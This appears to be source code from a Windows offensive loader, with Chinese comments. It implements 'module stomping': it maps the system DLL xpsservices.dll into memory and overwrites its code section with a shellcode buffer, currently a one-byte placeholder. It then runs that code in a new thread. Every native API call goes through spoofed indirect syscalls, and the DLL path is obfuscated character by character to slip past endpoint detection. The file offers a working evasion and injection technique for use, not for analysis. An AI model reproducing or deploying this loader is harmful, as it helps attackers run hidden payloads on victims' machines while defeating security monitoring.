#include "myloader.h"

BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
    NTSTATUS status = 0;
    HANDLE hFile = NULL;
    HANDLE hSection = NULL;
    PVOID pStompAddress = NULL;
    SIZE_T sViewSize = 0;
    // 1. 构造目标 DLL 的完整 NT 路径
    WCHAR szNtPath[] = { 
        L'\\', L'?', L'?', L'\\', 
        L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', 
        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 
        L'x', L'p', L's', L's', L'e', L'r', L'v', L'i', L'c', L'e', L's', L'.', L'd', L'l', L'l', 
        0 
    };
    UNICODE_STRING usNtPath;
    VxInitUnicodeString(&usNtPath, szNtPath);

    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(&objAttr, &usNtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK ioStatus = { 0 };

    // =========================================================================
    // NtOpenFile - 打开 DLL 文件
    // ========================================================================= 
    status = InvokeSpoofedSyscall(&pVxTable->NtOpenFile, 6,
        &hFile,
        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE, // 权限
        &objAttr,
        &ioStatus,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT // 选项
    );
    if (!NT_SUCCESS(status)) {
        //ERR("[-] NtOpenFile Failed: 0x%X", status);
        return FALSE;
    }
    // =========================================================================
    // NtCreateSection - 创建镜像节
    // ========================================================================= 
    // SEC_IMAGE (0x1000000)告诉内核按照 PE 结构解析文件
    status = InvokeSpoofedSyscall(&pVxTable->NtCreateSection, 7,
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        (PVOID)0,
        PAGE_EXECUTE_READ,
        SEC_IMAGE, 
        hFile
    );
    if (!NT_SUCCESS(status)) {
        InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
        //ERR("[-] NtCreateSection Failed: 0x%X", status);
        return FALSE;
    }
    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
    // =========================================================================
    // NtMapViewOfSection - 映射到内存
    // ========================================================================= 
    pStompAddress = NULL; 
    sViewSize = 0;  
    status = InvokeSpoofedSyscall(&pVxTable->NtMapViewOfSection, 10,
        hSection,
        (HANDLE)-1, // 当前进程
        &pStompAddress,
        (PVOID)0,
        (PVOID)0,
        NULL,
        &sViewSize,
        2, // ViewShare (继承方式)
        0,
        PAGE_EXECUTE_READ
    );
    //关闭Section 句柄
    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection);
    if (!NT_SUCCESS(status)) {
        //ERR("[-] NtMapViewOfSection Failed: 0x%X", status);
        return FALSE;
    }
    // LOG("[+] DLL Mapped at: %p (Size: 0x%llX)", pStompAddress, sViewSize);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pStompAddress;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pStompAddress + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    PVOID pCodeSection = NULL;
    SIZE_T sCodeSize = 0;

    // 遍历查找 .text
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pCodeSection = (PBYTE)pStompAddress + pSection[i].VirtualAddress;
            sCodeSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    if (!pCodeSection) {
        // ERR("[-] Code section not found");
        return FALSE;
    }
    // 4. 定义 Shellcode 
	unsigned char shellcode[] ="\x90";
        
    if (sizeof(shellcode) > sCodeSize){ 
        return FALSE;
    }
    // 5. 修改权限 RW 
    // 这里 pBaseAddress 必须指向我们要写入的地方 (pCodeSection)
    PVOID pProtectAddress = pCodeSection;
    SIZE_T sProtectSize = sizeof(shellcode);
    ULONG ulOldProtect = 0;
    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_READWRITE, &ulOldProtect);

    if (!NT_SUCCESS(status)) return FALSE;
    // 6. 写入 Payload
    VxMoveMemory(pCodeSection, shellcode, sizeof(shellcode));
    // 7. 恢复权限 RX
    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_EXECUTE_READ, &ulOldProtect);
    
    if (!NT_SUCCESS(status)) return FALSE;

    // 8. 创建线程
    HANDLE hThread = NULL;
    status = InvokeSpoofedSyscall(&pVxTable->NtCreateThreadEx, 11,
        &hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pCodeSection,
        NULL, FALSE, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
         LARGE_INTEGER Timeout;
         Timeout.QuadPart = -10000000;
         InvokeSpoofedSyscall(&pVxTable->NtWaitForSingleObject, 3, hThread, FALSE, &Timeout);
    }

    return NT_SUCCESS(status);
}